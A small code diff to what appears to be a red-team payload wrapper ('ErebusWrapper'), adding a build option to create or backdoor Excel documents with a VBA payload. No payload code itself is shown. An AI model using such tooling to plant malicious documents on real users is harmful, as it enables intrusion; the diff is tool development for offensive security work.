@@ -678,8 +678,8 @@ generated if none have been entered.""",
         BuildParameter(
             name="7.0 Create MalDoc",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Export VBA payload as .bas module file for manual import into Excel or disable MalDoc generation",
-            choices=["None", "VBA Module Only"],
+            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
+            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
             default_value="None",
             required=False,
         ),
@@ -1040,7 +1040,7 @@ generated if none have been entered.""",
         output = ""
 
         try:
-            # Run plugin validation only once at startup (class-level flag)
+            #Run plugin validation only once at startup
             if not ErebusWrapper._validation_run:
                 ErebusWrapper._validation_run = True
                 run_plugin_validation()
